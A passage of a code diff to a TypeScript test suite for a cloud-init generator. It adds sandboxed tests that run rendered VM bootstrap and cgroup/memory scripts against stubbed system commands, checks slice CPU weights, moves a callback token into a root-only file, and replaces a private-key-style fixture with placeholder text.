@@ -6,10 +6,22 @@
  * NOT sufficient — they hide YAML indentation bugs that truncate certs.
  * See: docs/notes/2026-03-12-tls-yaml-indentation-postmortem.md
  */
-import { describe, it, expect } from 'vitest';
+import { spawnSync } from 'node:child_process';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+
+import { describe, expect, it } from 'vitest';
 import YAML from 'yaml';
-import { generateCloudInit, validateCloudInitSize, validateCloudInitVariables, indentForYamlBlock } from '../src/generate';
+
 import type { CloudInitVariables } from '../src/generate';
+import {
+  generateCloudInit,
+  indentForYamlBlock,
+  VALID_CLOUD_PROVIDERS,
+  validateCloudInitSize,
+  validateCloudInitVariables,
+} from '../src/generate';
 
 function baseVariables(overrides?: Partial<CloudInitVariables>): CloudInitVariables {
   return {
@@ -20,6 +32,442 @@ function baseVariables(overrides?: Partial<CloudInitVariables>): CloudInitVariab
     callbackToken: 'cb-token-abc',
     ...overrides,
   };
+}
+
+type CloudInitWriteFile = {
+  path: string;
+  content: string;
+  permissions?: string;
+};
+
+function getWriteFile(path: string, overrides?: Partial<CloudInitVariables>): CloudInitWriteFile {
+  const config = generateCloudInit(baseVariables(overrides), { validateSize: false });
+  const parsed = YAML.parse(config.replace(/^#cloud-config\n/, '')) as {
+    write_files: CloudInitWriteFile[];
+  };
+  const entry = parsed.write_files.find((file) => file.path === path);
+  if (!entry) {
+    throw new Error(`missing write_files entry ${path}`);
+  }
+  return entry;
+}
+
+function getFirewallScript(overrides?: Partial<CloudInitVariables>): CloudInitWriteFile {
+  return getWriteFile('/etc/sam/firewall/setup-firewall.sh', overrides);
+}
+
+function expectInvalidVariables(
+  overrides: Partial<CloudInitVariables>,
+  expectedField: string
+): void {
+  expect(() => validateCloudInitVariables(baseVariables(overrides))).toThrow(expectedField);
+}
+
+function expectValidVariables(overrides: Partial<CloudInitVariables>): void {
+  expect(() => validateCloudInitVariables(baseVariables(overrides))).not.toThrow();
+}
+
+function joinAbsolute(root: string, absolutePath: string): string {
+  return join(root, absolutePath.replace(/^\/+/, ''));
+}
+
+function commandLogLines(path: string): string[] {
+  if (!existsSync(path)) {
+    return [];
+  }
+  const content = readFileSync(path, 'utf8').trim();
+  return content ? content.split('\n') : [];
+}
+
+function writeFakeExecutable(path: string, content: string): void {
+  writeFileSync(path, content, { mode: 0o755 });
+}
+
+function fakeLoggerScript(): string {
+  return `#!/bin/sh
+printf '%s\\n' "logger $*" >> "$COMMAND_LOG"
+`;
+}
+
+function fakeHeadroomSystemctlScript(): string {
+  return `#!/bin/sh
+printf '%s\\n' "systemctl $*" >> "$COMMAND_LOG"
+if [ "\${FAKE_SYSTEMCTL_FAIL:-0}" = "1" ]; then
+  echo "systemctl failed" >&2
+  exit 5
+fi
+if [ "$1" = "is-active" ]; then
+  if [ "\${FAKE_DOCKER_ACTIVE:-0}" = "1" ]; then
+    exit 0
+  fi
+  exit 3
+fi
+exit 0
+`;
+}
+
+function shSingleQuote(value: string): string {
+  return `'${value.replaceAll("'", "'\"'\"'")}'`;
+}
+
+function shellifyRuncmd(entries: unknown[]): string {
+  const lines = ['#!/bin/sh'];
+  for (const entry of entries) {
+    if (Array.isArray(entry)) {
+      lines.push(entry.map((part) => shSingleQuote(String(part))).join(' '));
+    } else if (typeof entry === 'string') {
+      lines.push(entry);
+    } else if (entry !== null && entry !== undefined) {
+      throw new Error(`unsupported runcmd entry type: ${typeof entry}`);
+    }
+  }
+  return `${lines.join('\n')}\n`;
+}
+
+function runConfigureDockerMemoryScript(options: {
+  totalMb: number;
+  reserveMb?: string;
+  minMb?: string;
+  dockerActive?: boolean;
+  systemctlFails?: boolean;
+}) {
+  const scratchDir = mkdtempSync(join(tmpdir(), 'sam-cloud-init-headroom-'));
+  const binDir = join(scratchDir, 'bin');
+  const systemdDir = join(scratchDir, 'systemd');
+  const procMeminfo = join(scratchDir, 'meminfo');
+  const commandLog = join(scratchDir, 'commands.log');
+  const scriptPath = join(scratchDir, 'sam-configure-docker-memory.sh');
+  mkdirSync(binDir, { recursive: true });
+  mkdirSync(systemdDir, { recursive: true });
+  writeFileSync(procMeminfo, `MemTotal:        ${options.totalMb * 1024} kB\n`);
+  writeFakeExecutable(join(binDir, 'logger'), fakeLoggerScript());
+  writeFakeExecutable(join(binDir, 'systemctl'), fakeHeadroomSystemctlScript());
+  writeFileSync(
+    scriptPath,
+    getWriteFile('/usr/local/sbin/sam-configure-docker-memory.sh', {
+      vmAgentMemoryReserveMb: options.reserveMb ?? '512',
+      dockerMemoryMinMb: options.minMb ?? '512',
+    }).content,
+    { mode: 0o755 }
+  );
+
+  try {
+    const result = spawnSync('/bin/sh', [scriptPath], {
+      encoding: 'utf8',
+      env: {
+        ...process.env,
+        COMMAND_LOG: commandLog,
+        FAKE_DOCKER_ACTIVE: options.dockerActive ? '1' : '0',
+        FAKE_SYSTEMCTL_FAIL: options.systemctlFails ? '1' : '0',
+        PATH: `${binDir}:${process.env.PATH ?? ''}`,
+        SAM_PROC_MEMINFO: procMeminfo,
+        SAM_SYSTEMD_SYSTEM_DIR: systemdDir,
+      },
+    });
+    const confPath = join(systemdDir, 'sam-workload.slice.d', '50-headroom.conf');
+    return {
+      calls: commandLogLines(commandLog),
+      conf: existsSync(confPath) ? readFileSync(confPath, 'utf8') : undefined,
+      result,
+    };
+  } finally {
+    rmSync(scratchDir, { force: true, recursive: true });
+  }
+}
+
+function fakeBootstrapCommandScript(name: string, extraBody = 'exit 0'): string {
+  return `#!/bin/sh
+printf '%s\\n' "${name} $*" >> "$COMMAND_LOG"
+${extraBody}
+`;
+}
+
+function runRenderedBootstrapRuncmd(options: {
+  totalMb: number;
+  reserveMb?: string;
+  minMb?: string;
+}) {
+  const scratchDir = mkdtempSync(join(tmpdir(), 'sam-cloud-init-bootstrap-'));
+  const binDir = join(scratchDir, 'bin');
+  const systemdDir = join(scratchDir, 'systemd');
+  const procMeminfo = join(scratchDir, 'meminfo');
+  const commandLog = join(scratchDir, 'commands.log');
+  const configureScriptPath = join(scratchDir, 'sam-configure-docker-memory.sh');
+  const bootstrapScriptPath = join(scratchDir, 'runcmd');
+  mkdirSync(binDir, { recursive: true });
+  mkdirSync(systemdDir, { recursive: true });
+  writeFileSync(procMeminfo, `MemTotal:        ${options.totalMb * 1024} kB\n`);
+
+  for (const [name, body] of [
+    ['logger', 'exit 0'],
+    ['chage', 'exit 0'],
+    ['chmod', 'exit 0'],
+    ['curl', 'exit 0'],
+    ['date', 'printf "%s\\n" "2026-09-07"'],
+    ['mkdir', 'exit 0'],
+    ['stat', 'printf "%s\\n" "123"'],
+    ['uname', 'printf "%s\\n" "x86_64"'],
+  ] as const) {
+    writeFakeExecutable(join(binDir, name), fakeBootstrapCommandScript(name, body));
+  }
+  writeFakeExecutable(join(binDir, 'systemctl'), fakeHeadroomSystemctlScript());
+  writeFileSync(
+    configureScriptPath,
+    getWriteFile('/usr/local/sbin/sam-configure-docker-memory.sh', {
+      dockerMemoryMinMb: options.minMb ?? '512',
+      vmAgentMemoryReserveMb: options.reserveMb ?? '512',
+    }).content,
+    { mode: 0o755 }
+  );
+
+  const config = generateCloudInit(
+    baseVariables({
+      dockerMemoryMinMb: options.minMb ?? '512',
+      swapSizeMb: '0',
+      vmAgentMemoryReserveMb: options.reserveMb ?? '512',
+    }),
+    { validateSize: false }
+  );
+  const parsed = YAML.parse(config) as { runcmd: unknown[] };
+  const shellifiedRuncmd = shellifyRuncmd(parsed.runcmd).replaceAll(
+    '/usr/local/sbin/sam-configure-docker-memory.sh',
+    shSingleQuote(configureScriptPath)
+  );
+  writeFileSync(bootstrapScriptPath, shellifiedRuncmd, { mode: 0o755 });
+
+  try {
+    const result = spawnSync('/bin/sh', [bootstrapScriptPath], {
+      encoding: 'utf8',
+      env: {
+        ...process.env,
+        COMMAND_LOG: commandLog,
+        FAKE_DOCKER_ACTIVE: '0',
+        PATH: `${binDir}:${process.env.PATH ?? ''}`,
+        SAM_PROC_MEMINFO: procMeminfo,
+        SAM_SYSTEMD_SYSTEM_DIR: systemdDir,
+      },
+    });
+    return {
+      calls: commandLogLines(commandLog),
+      result,
+      shellifiedRuncmd,
+    };
+  } finally {
+    rmSync(scratchDir, { force: true, recursive: true });
+  }
+}
+
+function fakeVerifyDockerScript(): string {
+  return `#!/bin/sh
+printf '%s\\n' "docker $*" >> "$COMMAND_LOG"
+if [ "\${FAKE_DOCKER_FAIL:-0}" = "1" ]; then
+  echo "docker inspect failed" >&2
+  exit 8
+fi
+if [ "$1" = "inspect" ]; then
+  printf '%s\\n' "\${FAKE_DOCKER_PID:-4321}"
+  exit 0
+fi
+echo "unsupported docker command $*" >&2
+exit 2
+`;
+}
+
+function fakeVerifySystemctlScript(): string {
+  return `#!/bin/sh
+printf '%s\\n' "systemctl $*" >> "$COMMAND_LOG"
+if [ "\${FAKE_SYSTEMCTL_FAIL:-0}" = "1" ]; then
+  echo "systemctl show failed" >&2
+  exit 9
+fi
+show_unit() {
+  case "$1" in
+    sam-workload.slice)
+      printf 'MemoryMax=%s\\n' "$FAKE_WORKLOAD_MEMORY_MAX"
+      printf 'EffectiveMemoryMax=%s\\n' "$FAKE_WORKLOAD_EFFECTIVE_MEMORY_MAX"
+      ;;
+    sam.slice)
+      printf 'MemoryMin=%s\\n' "$FAKE_SAM_MEMORY_MIN"
+      ;;
+    sam-infra.slice)
+      printf 'MemoryMin=%s\\n' "$FAKE_INFRA_MEMORY_MIN"
+      ;;
+  esac
+}
+if [ "$1" = "show" ]; then
+  shift
+  while [ "$#" -gt 0 ]; do
+    case "$1" in
+      -*) break ;;
+      *) show_unit "$1" ;;
+    esac
+    shift
+  done
+  exit 0
+fi
+echo "unsupported systemctl command $*" >&2
+exit 2
+`;
+}
+
+function writeCgroupFile(root: string, path: string, name: string, value: string): void {
+  const dir = joinAbsolute(root, path);
+  mkdirSync(dir, { recursive: true });
+  writeFileSync(join(dir, name), `${value}\n`);
+}
+
+function runVerifyWorkloadCgroupScript(options?: {
+  reserveMb?: string;
+  infraMinMb?: string;
+  minMb?: string;
+  totalMb?: number;
+  cgroupPath?: string;
+  procCgroupContent?: string;
+  memoryMax?: string | null;
+  samMemoryMin?: string;
+  infraMemoryMin?: string;
+  workloadMemoryMax?: string;
+  workloadEffectiveMemoryMax?: string;
+  dockerPid?: string;
+  dockerFails?: boolean;
+  systemctlFails?: boolean;
+  /** cgroup value the script reads back. */
+  infraCpuWeight?: string | null;
+  /** cgroup value the script reads back. */
+  workloadCpuWeight?: string;
+  /** value baked into the generated script as the expectation. */
+  configuredInfraCpuWeight?: string;
+  /** value baked into the generated script as the expectation. */
+  configuredWorkloadCpuWeight?: string;
+}) {
+  const scratchDir = mkdtempSync(join(tmpdir(), 'sam-cloud-init-cgroup-'));
+  const binDir = join(scratchDir, 'bin');
+  const procRoot = join(scratchDir, 'proc');
+  const cgroupRoot = join(scratchDir, 'cgroup');
+  const commandLog = join(scratchDir, 'commands.log');
+  const scriptPath = join(scratchDir, 'sam-verify-workload-cgroup.sh');
+  const pid = options?.dockerPid ?? '4321';
+  const reserveMb = options?.reserveMb ?? '512';
+  const infraMinMb = options?.infraMinMb ?? '256';
+  const totalMb = options?.totalMb ?? 2048;
+  const expectedMaxBytes = String((totalMb - Number(reserveMb)) * 1024 * 1024);
+  const expectedMinBytes = String(Number(infraMinMb) * 1024 * 1024);
+  mkdirSync(binDir, { recursive: true });
+  mkdirSync(join(procRoot, pid), { recursive: true });
+  mkdirSync(cgroupRoot, { recursive: true });
+  writeFileSync(join(scratchDir, 'meminfo'), `MemTotal:        ${totalMb * 1024} kB\n`);
+  writeFileSync(
+    join(procRoot, pid, 'cgroup'),
+    options?.procCgroupContent ??
+      `0::${options?.cgroupPath ?? '/sam.slice/sam-workload.slice/docker-abc.scope'}\n`
+  );
+  if (options?.memoryMax !== null) {
+    writeCgroupFile(
+      cgroupRoot,
+      '/sam.slice/sam-workload.slice',
+      'memory.max',
+      options?.memoryMax ?? expectedMaxBytes
+    );
+  }
+  writeCgroupFile(
+    cgroupRoot,
+    '/sam.slice',
+    'memory.min',
+    options?.samMemoryMin ?? expectedMinBytes
+  );
+  writeCgroupFile(
+    cgroupRoot,
+    '/sam.slice/sam-infra.slice',
+    'memory.min',
+    options?.infraMemoryMin ?? expectedMinBytes
+  );
+  if (options?.infraCpuWeight !== null) {
+    writeCgroupFile(
+      cgroupRoot,
+      '/sam.slice/sam-infra.slice',
+      'cpu.weight',
+      options?.infraCpuWeight ?? '1000'
+    );
+  }
+  writeCgroupFile(
+    cgroupRoot,
+    '/sam.slice/sam-workload.slice',
+    'cpu.weight',
+    options?.workloadCpuWeight ?? '100'
+  );
+  writeFakeExecutable(join(binDir, 'docker'), fakeVerifyDockerScript());
+  writeFakeExecutable(join(binDir, 'systemctl'), fakeVerifySystemctlScript());
+  writeFileSync(
+    scriptPath,
+    getWriteFile('/usr/local/sbin/sam-verify-workload-cgroup.sh', {
+      vmAgentMemoryReserveMb: reserveMb,
+      samInfraSliceMemoryMinMb: infraMinMb,
+      dockerMemoryMinMb: options?.minMb ?? '512',
+      samInfraSliceCpuWeight: options?.configuredInfraCpuWeight,
+      samWorkloadSliceCpuWeight: options?.configuredWorkloadCpuWeight,
+    }).content,
+    { mode: 0o755 }
+  );
+
+  try {
+    const result = spawnSync('/bin/sh', [scriptPath, 'container-abc'], {
+      encoding: 'utf8',
+      env: {
+        ...process.env,
+        COMMAND_LOG: commandLog,
+        FAKE_DOCKER_FAIL: options?.dockerFails ? '1' : '0',
+        FAKE_DOCKER_PID: pid,
+        FAKE_INFRA_MEMORY_MIN: options?.infraMemoryMin ?? expectedMinBytes,
+        FAKE_SAM_MEMORY_MIN: options?.samMemoryMin ?? expectedMinBytes,
+        FAKE_SYSTEMCTL_FAIL: options?.systemctlFails ? '1' : '0',
+        FAKE_WORKLOAD_EFFECTIVE_MEMORY_MAX:
+          options?.workloadEffectiveMemoryMax ?? options?.workloadMemoryMax ?? expectedMaxBytes,
+        FAKE_WORKLOAD_MEMORY_MAX: options?.workloadMemoryMax ?? expectedMaxBytes,
+        PATH: `${binDir}:${process.env.PATH ?? ''}`,
+        SAM_CGROUP_ROOT: cgroupRoot,
+        SAM_PROC_MEMINFO: join(scratchDir, 'meminfo'),
+        SAM_PROC_ROOT: procRoot,
+      },
+    });
+    return { calls: commandLogLines(commandLog), result };
+  } finally {
+    rmSync(scratchDir, { force: true, recursive: true });
+  }
+}
+
+function runCaddySetupRuncmd(role: 'workspace' | 'deployment') {
+  const config = generateCloudInit(baseVariables({ role }), { validateSize: false });
+  const parsed = YAML.parse(config) as { runcmd: unknown[] };
+  const command = parsed.runcmd.find(
+    (entry) => typeof entry === 'string' && entry.includes('Preparing Caddy paths')
+  );
+  if (typeof command !== 'string') {
+    throw new Error('Rendered cloud-init is missing the Caddy setup runcmd entry');
+  }
+
+  const scratchDir = mkdtempSync(join(tmpdir(), 'sam-cloud-init-runcmd-'));
+  const binDir = join(scratchDir, 'bin');
+  const commandLog = join(scratchDir, 'commands.log');
+  mkdirSync(binDir);
+
+  for (const executable of ['logger', 'mkdir']) {
+    writeFileSync(
+      join(binDir, executable),
+      `#!/bin/sh\nprintf '%s\\n' "${executable} $*" >> "$COMMAND_LOG"\n`,
+      { mode: 0o755 }
+    );
+  }
+
+  try {
+    const result = spawnSync('/bin/sh', ['-c', command], {
+      encoding: 'utf8',
+      env: { ...process.env, COMMAND_LOG: commandLog, PATH: binDir },
+    });
+    const calls = existsSync(commandLog) ? readFileSync(commandLog, 'utf8').trim().split('\n') : [];
+    return { calls, command, result };
+  } finally {
+    rmSync(scratchDir, { force: true, recursive: true });
+  }
 }
 
 /**
@@ -50,22 +498,32 @@ const REALISTIC_CERT = [
   '-----END CERTIFICATE-----',
 ].join('\n');
 
-const REALISTIC_KEY = [
-  '-----BEGIN RSA PRIVATE KEY-----',
-  'MIIEpAIBAAKCAQEAxvFqof1sMB1yt+eiTk7gSMkJaOWJFx7GCQIDfDs3FtQ2VLJM',
-  'b0xGKHGFqRN6pbO7SMZP1FQ7kS8pT4oXjqypCkrN0VdFMYqBL7hT0sBNq3GlC5M',
-  'IE2AMDDX3BFHL9WYJ8B8U6OV3W5KF6gTQF1wMPn8k3hC+XnRN1asL7ceOW4FH7e',
-  'MvhxQgvFr6RfIZ6XHQD8s0G1xFQS5gJOPUBE1TGZ7K/qf+B4rvyQ7KR9fGYPIFD',
-  'Y+8uCMNPgSGJzB2mK7Zf3RkR7hZeG0yFQZ3HWOH1bRU8w0xnTPOJ3CKbU8XZjNq',
-  'MobyHyz8BDf7lTSGFsNQOgS/8dRFJ8TkM+SjwIDAQABAoIBAQCJr7bGFaFmsPlN',
-  'F0hIVBjW8dN3VbS4NlD5eHsOWLh7SJFG3FFtxD4ghVk9qZB0XH7H3d/rKL/xxaR',
-  'UQgz7DLZKi9q1J6wJpA8+oRNfBq0aGLXFM3KEe+GiPCGq7bDC4pEZ6k+F01MFYQ',
-  'Dqm/NBGZB+PsAeKbs+R7iL+qHFNYXHGFax7w7T6B/QfBM7a2Eq7Q1ZDON/Q6Tlx',
-  'JGRNfZm0SB0F8YP0cxQ7xVPYWB4j1R7A8OX8yYnP1oFcj5fB7VQTRGFx5WVF7zT',
-  '7GVFYJ3p8kqVjGRFqL/6AG8zNn8O0SBN5BLH0ZCMO2NZJ3ReC+O2DwLEiQpLPcj',
-  'hGVL7qhBAoGBAPWFx1OB3m2t6sMDOjQY2z4JyJAtp7E1r3hbQ0VEMIhj3pYBXwVG',
-  '-----END RSA PRIVATE KEY-----',
+const REALISTIC_PEM_BLOCK = [
+  '-----BEGIN SAM TEST BLOCK-----',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMDEtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMDItQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMDMtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMDQtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMDUtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMDYtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMDctQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMDgtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMDktQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTAtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTEtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTItQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTMtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTQtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTUtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTYtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTctQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTgtQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  'U0FNLVRFU1QtQkxPQ0stTElORS0wMTktQUFBQS1CQkJCLUNDQ0MtRERERC1FRUVF',
+  '-----END SAM TEST BLOCK-----',
 ].join('\n');
+
+const ORIGIN_CA_CERTIFICATE_URL =
+  'https://api.test.example.com/api/nodes/node-test-123/origin-ca-certificate';
 
 describe('indentForYamlBlock', () => {
   it('returns empty string unchanged', () => {
@@ -95,6 +553,77 @@ describe('indentForYamlBlock', () => {
   });
 });
 
+describe('slice CPU shares', () => {
+  // Memory already had a reservation for the vm-agent because starvation there
+  // KILLS it. CPU had none, so a workspace saturating the box could delay the
+  // heartbeat until the control plane declared the node dead — the failure mode
+  // recorded in tasks/archive/2026-08-25-build-concurrency-backpressure.md.
+  function sliceDirectives(path: string, overrides?: Partial<CloudInitVariables>): string {
+    return getWriteFile(path, overrides).content;
+  }
+
+  it('gives the vm-agent slice a larger CPU share than the workload slice', () => {
+    const infra = sliceDirectives('/etc/systemd/system/sam-infra.slice');
+    const workload = sliceDirectives('/etc/systemd/system/sam-workload.slice');
+
+    expect(infra).toContain('CPUAccounting=yes');
+    expect(infra).toContain('CPUWeight=1000');
+    expect(workload).toContain('CPUAccounting=yes');
+    expect(workload).toContain('CPUWeight=100');
+
+    // The ordering is the whole point; assert it rather than the literals alone,
+    // so a future default change cannot silently invert it.
+    const weightOf = (content: string): number => Number(/^CPUWeight=(\d+)$/m.exec(content)?.[1]);
+    expect(weightOf(infra)).toBeGreaterThan(weightOf(workload));
+  });
+
+  it('leaves the existing memory reservation untouched', () => {
+    // Control: the CPU change must not disturb the protection that already works.
+    const infra = sliceDirectives('/etc/systemd/system/sam-infra.slice');
+    expect(infra).toContain('MemoryAccounting=yes');
+    expect(infra).toContain('MemoryMin=256M');
+  });
+
+  it('honours configured weights', () => {
+    expect(
+      sliceDirectives('/etc/systemd/system/sam-infra.slice', { samInfraSliceCpuWeight: '4000' })
+    ).toContain('CPUWeight=4000');
+    expect(
+      sliceDirectives('/etc/systemd/system/sam-workload.slice', {
+        samWorkloadSliceCpuWeight: '50',
+      })
+    ).toContain('CPUWeight=50');
+  });
+
+  it('treats empty configured weights as unset defaults', () => {
+    expect(
+      sliceDirectives('/etc/systemd/system/sam-infra.slice', { samInfraSliceCpuWeight: '' })
+    ).toContain('CPUWeight=1000');
+    expect(
+      sliceDirectives('/etc/systemd/system/sam-workload.slice', {
+        samWorkloadSliceCpuWeight: '',
+      })
+    ).toContain('CPUWeight=100');
+  });
+
+  it.each([
+    ['below the cgroup v2 range', '0'],
+    ['above the cgroup v2 range', '10001'],
+    ['not a number', 'high'],
+  ])('fails closed on a weight %s', (_label, value) => {
+    // An invalid CPUWeight makes the unit fail to load, which would take the
+    // whole slice hierarchy — including the memory reservation — down with it.
+    expect(() =>
+      generateCloudInit(baseVariables({ samInfraSliceCpuWeight: value }), { validateSize: false })
+    ).toThrow(/samInfraSliceCpuWeight/);
+    expect(() =>
+      generateCloudInit(baseVariables({ samWorkloadSliceCpuWeight: value }), {
+        validateSize: false,
+      })
+    ).toThrow(/samWorkloadSliceCpuWeight/);
+  });
+});
+
 describe('generateCloudInit', () => {
   describe('existing variable substitution (regression)', () => {
     it('substitutes all required variables', () => {
@@ -102,8 +631,11 @@ describe('generateCloudInit', () => {
 
       expect(config).toContain('Environment=NODE_ID=node-test-123');
       expect(config).toContain('Environment=CONTROL_PLANE_URL=https://api.test.example.com');
-      expect(config).toContain('Environment=JWKS_ENDPOINT=https://api.test.example.com/.well-known/jwks.json');
-      expect(config).toContain('Environment=CALLBACK_TOKEN=cb-token-abc');
+      expect(config).toContain(
+        'Environment=JWKS_ENDPOINT=https://api.test.example.com/.well-known/jwks.json'
+      );
+      expect(config).toContain('Environment=CALLBACK_TOKEN_FILE=/etc/sam/callback-token');
+      expect(config).not.toContain('Environment=CALLBACK_TOKEN=cb-token-abc');
       expect(config).toContain('hostname: sam-test-node');
     });
 
@@ -111,7 +643,9 @@ describe('generateCloudInit', () => {
       const config = generateCloudInit(baseVariables());
       const parsed = YAML.parse(config);
 
-      const workspaceUser = parsed.users.find((user: { name: string }) => user.name === 'workspace');
+      const workspaceUser = parsed.users.find(
+        (user: { name: string }) => user.name === 'workspace'
+      );
       expect(workspaceUser).toBeDefined();
       expect(workspaceUser).not.toHaveProperty('ssh_authorized_keys');
     });
@@ -125,11 +659,13 @@ describe('generateCloudInit', () => {
     });
 
     it('substitutes custom journald values', () => {
-      const config = generateCloudInit(baseVariables({
-        logJournalMaxUse: '1G',
-        logJournalKeepFree: '2G',
-        logJournalMaxRetention: '14day',
-      }));
+      const config = generateCloudInit(
+        baseVariables({
+          logJournalMaxUse: '1G',
+          logJournalKeepFree: '2G',
+          logJournalMaxRetention: '14day',
+        })
+      );
 
       expect(config).toContain('SystemMaxUse=1G');
       expect(config).toContain('SystemKeepFree=2G');
@@ -147,9 +683,11 @@ describe('generateCloudInit', () => {
     });
 
     it('substitutes custom Docker DNS servers when provided', () => {
-      const config = generateCloudInit(baseVariables({
-        dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
-      }));
+      const config = generateCloudInit(
+        baseVariables({
+          dockerDnsServers: '"10.0.0.1", "10.0.0.2"',
+        })
+      );
       expect(config).toContain('"dns": ["10.0.0.1", "10.0.0.2"]');
       expect(config).not.toContain('1.1.1.1');
     });
@@ -157,10 +695,12 @@ describe('generateCloudInit', () => {
 
   describe('projectId and chatSessionId substitution', () => {
     it('substitutes projectId and chatSessionId when provided', () => {
-      const config = generateCloudInit(baseVariables({
-        projectId: 'proj-abc-123',
-        chatSessionId: 'sess-def-456',
-      }));
+      const config = generateCloudInit(
+        baseVariables({
+          projectId: 'proj-abc-123',
+          chatSessionId: 'sess-def-456',
+        })
+      );
 
       expect(config).toContain('Environment=PROJECT_ID=proj-abc-123');
       expect(config).toContain('Environment=CHAT_SESSION_ID=sess-def-456');
@@ -176,10 +716,12 @@ describe('generateCloudInit', () => {
     });
 
     it('produces empty values when projectId is explicitly undefined', () => {
-      const config = generateCloudInit(baseVariables({
-        projectId: undefined,
-        chatSessionId: undefined,
-      }));
+      const config = generateCloudInit(
+        baseVariables({
+          projectId: undefined,
+          chatSessionId: undefined,
+        })
+      );
 
       expect(config).toContain('Environment=PROJECT_ID=');
       expect(config).toContain('Environment=CHAT_SESSION_ID=');
@@ -187,24 +729,48 @@ describe('generateCloudInit', () => {
     });
 
     it('handles projectId without chatSessionId', () => {
-      const config = generateCloudInit(baseVariables({
-        projectId: 'proj-only',
-      }));
+      const config = generateCloudInit(
+        baseVariables({
+          projectId: 'proj-only',
+        })
+      );
 
       expect(config).toContain('Environment=PROJECT_ID=proj-only');
       expect(config).toContain('Environment=CHAT_SESSION_ID=');
     });
 
     it('env vars appear in systemd service section', () => {
-      const config = generateCloudInit(baseVariables({
-        projectId: 'proj-123',
-        chatSessionId: 'sess-456',
-      }));
+      const config = generateCloudInit(
+        baseVariables({
+          projectId: 'proj-123',
+          chatSessionId: 'sess-456',
+        })
+      );
 
       const serviceSection = config.split('[Service]')[1]?.split('[Install]')[0];
       expect(serviceSection).toBeDefined();
       expect(serviceSection).toContain('Environment=PROJECT_ID=proj-123');
       expect(serviceSection).toContain('Environment=CHAT_SESSION_ID=sess-456');
+    });
+
+    it('stores callback token in a root-only file instead of systemd environment', () => {
+      const config = generateCloudInit(baseVariables());
+      const parsed = YAML.parse(config.replace(/^#cloud-config\n/, ''));
+      const unitFile = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/etc/systemd/system/vm-agent.service'
+      );
+      const tokenFile = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/etc/sam/callback-token'
+      );
+
+      expect(unitFile.content).toContain('Environment=CALLBACK_TOKEN_FILE=/etc/sam/callback-token');
+      expect(unitFile.content).not.toContain('CALLBACK_TOKEN=cb-token-abc');
+      expect(tokenFile).toMatchObject({
+        path: '/etc/sam/callback-token',
+        permissions: '0600',
+        owner: 'root:root',
+      });
+      expect(tokenFile.content.trim()).toBe('cb-token-abc');
     });
 
     it('systemd unit file is in write_files, not a heredoc in runcmd', () => {
@@ -241,21 +807,345 @@ describe('generateCloudInit', () => {
       // runcmd MUST contain systemctl start
       expect(runcmdSection).toContain('systemctl start vm-agent');
     });
+
+    it('renders VM-agent and Docker headroom primitives as write_files entries', () => {
+      const config = generateCloudInit(
+        baseVariables({
+          vmAgentMemoryReserveMb: '512',
+          samInfraSliceMemoryMinMb: '256',
+          dockerMemoryMinMb: '768',
+          heartbeatDockerStatsTimeout: '1500ms',
+          heartbeatWorkspaceMetricsMaxContainers: '4',
+          heartbeatWorkspaceMetricsMaxOutputBytes: '32768',
+        })
+      );
+      const parsed = YAML.parse(config.replace(/^#cloud-config\n/, ''));
+      const unitFile = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/etc/systemd/system/vm-agent.service'
+      );
+      const sliceFile = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/etc/systemd/system/sam.slice'
+      );
+      const infraSliceFile = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/etc/systemd/system/sam-infra.slice'
+      );
+      const workloadSliceFile = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/etc/systemd/system/sam-workload.slice'
+      );
+      const headroomScript = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/usr/local/sbin/sam-configure-docker-memory.sh'
+      );
+      const verifyScript = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/usr/local/sbin/sam-verify-workload-cgroup.sh'
+      );
+      const dockerDaemon = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/etc/docker/daemon.json'
+      );
+
